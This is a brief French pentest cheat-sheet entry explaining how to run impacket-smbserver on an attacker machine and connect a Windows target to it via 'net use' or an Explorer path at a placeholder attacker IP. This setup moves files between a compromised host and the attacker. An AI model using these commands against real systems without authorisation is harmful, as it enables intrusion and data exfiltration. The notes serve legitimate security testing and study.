# impacket

### smbserver

Permet d'ouvrir un serveur SMB sur la machine d'attaque.

```
impacket-smbserver -smb2support -username <USER> -password <PASS> <NOM-DU-SHARE> <CHEMIN-DU-SHARE>

# Sur la machine Windows
net use \\<IP-MACHINE-ATTAQUE>\<NOM-DU-SHARE> /USER:<USER> <PASSWORD>

ou 

\\<IP-MACHINE-ATTAQUE>\<NOM-DU-SHARE> #Dans l'explorateur de fichier
```
